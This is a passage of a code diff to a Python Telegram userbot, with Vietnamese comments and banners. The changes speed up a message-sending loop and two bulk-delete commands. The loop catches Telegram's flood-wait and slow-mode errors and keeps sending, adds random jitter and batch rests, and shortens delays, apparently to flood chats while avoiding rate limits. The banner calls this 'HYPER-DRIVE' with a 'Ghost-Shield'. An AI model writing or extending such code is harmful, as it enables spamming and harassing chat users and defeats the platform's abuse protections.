+                        sent = True
+                        count += 1
+                    except FloodWaitError as e:
+                        await asyncio.sleep(e.seconds + 1)
+                    except SlowModeWaitError as e:
+                        await asyncio.sleep(e.seconds + 1)
+                    except Exception:
+                        await asyncio.sleep(0.3)
+                        break
+
+                if count % SYSTEM_CONFIG["batch_rest"] == 0 and RUNNING_TASKS.get(chat_id):
+                    await asyncio.sleep(SYSTEM_CONFIG["rest_time"])
+
+                jitter = random.uniform(0.02, 0.05)
+                await asyncio.sleep(SYSTEM_CONFIG["delay"] + jitter)
+
+            RUNNING_TASKS[chat_id] = False
+            return
+
+        # --- LỆNH: .del & .xoahet ---
         if cmd == f"{PREFIX}del":
             count = int(args[0]) if (args and args[0].isdigit()) else 1
             try:
@@ -507,12 +539,11 @@ async def central_handler(event):
                 try:
                     await msg.delete()
                     deleted += 1
-                    await asyncio.sleep(0.05)
+                    await asyncio.sleep(0.04)
                 except Exception:
                     pass
             return
 
-        # --- LỆNH: .xoahet / .purge ---
         if cmd in [f"{PREFIX}xoahet", f"{PREFIX}purge"]:
             reply = await event.get_reply_message()
             if not reply:
@@ -531,7 +562,7 @@ async def central_handler(event):
                     batch = msg_ids[i:i + 100]
                     try:
                         await client.delete_messages(chat_id, batch)
-                        await asyncio.sleep(0.12)
+                        await asyncio.sleep(0.08)
                     except MessageDeleteForbiddenError:
                         pass
             return
@@ -549,12 +580,11 @@ async def main():
     MY_ID = me.id
     ALLOWED_USERS.add(MY_ID)
 
-    print("=" * 60)
-    print(f"[*] BÁT QUÁI TRẬN V6 ANH KHÔI ĐÃ SẴN SÀNG CHIẾN ĐẤU!")
+    print("=" * 65)
+    print(f"[*] HỆ THỐNG HYPER-DRIVE 0.1S ANH KHÔI ĐÃ SẴN SÀNG!")
     print(f"[*] Tài khoản Bot: {me.first_name} | @{me.username} | ID: {me.id}")
-    print(f"[*] Danh sách Admin cho phép điều khiển: {ALLOWED_USERS}")
-    print(f"[*] Tốc độ xung trận: {SYSTEM_CONFIG['delay']}s/đòn | Ghost-Shield v6: ONLINE")
-    print("=" * 60)
+    print(f"[*] Cấu hình Vận tốc: {SYSTEM_CONFIG['delay']}s | Nghỉ: {SYSTEM_CONFIG['rest_time']}s | Ghost-Shield v7: ACTIVE")
+    print("=" * 65)
 
     await client.run_until_disconnected()
 
